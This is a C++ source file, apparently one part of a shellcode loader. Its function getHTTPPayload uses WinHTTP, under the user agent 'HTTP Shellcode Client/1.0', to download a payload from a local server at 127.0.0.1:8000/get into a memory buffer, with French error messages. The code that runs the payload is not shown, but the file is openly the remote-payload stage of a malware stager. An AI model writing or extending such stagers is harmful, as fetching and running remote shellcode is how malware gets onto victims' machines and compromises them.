#include "HTTPClient.h"
#include <winhttp.h>
#include <iostream>

#pragma comment(lib, "winhttp.lib")

PBYTE getHTTPPayload(DWORD& payloadSize) {
    HINTERNET hSession = WinHttpOpen(L"HTTP Shellcode Client/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) {
        std::cerr << "Erreur : WinHttpOpen a échoué avec l'erreur : " << GetLastError() << std::endl;
        return nullptr;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8000, 0);
    if (!hConnect) {
        std::cerr << "Erreur : WinHttpConnect a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/get",
        nullptr, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    if (!hRequest) {
        std::cerr << "Erreur : WinHttpOpenRequest a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    BOOL result = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!result) {
        std::cerr << "Erreur : WinHttpSendRequest a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    result = WinHttpReceiveResponse(hRequest, nullptr);
    if (!result) {
        std::cerr << "Erreur : WinHttpReceiveResponse a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    DWORD availableSize = 0;
    if (!WinHttpQueryDataAvailable(hRequest, &availableSize)) {
        std::cerr << "Erreur : WinHttpQueryDataAvailable a échoué avec l'erreur : " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    PBYTE buffer = (PBYTE)LocalAlloc(LPTR, availableSize);
    if (!buffer) {
        std::cerr << "Erreur : Allocation mémoire insuffisante." << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    DWORD bytesRead = 0;
    if (!WinHttpReadData(hRequest, buffer, availableSize, &bytesRead)) {
        std::cerr << "Erreur : WinHttpReadData a échoué avec l'erreur : " << GetLastError() << std::endl;
        LocalFree(buffer);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return nullptr;
    }

    payloadSize = bytesRead;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
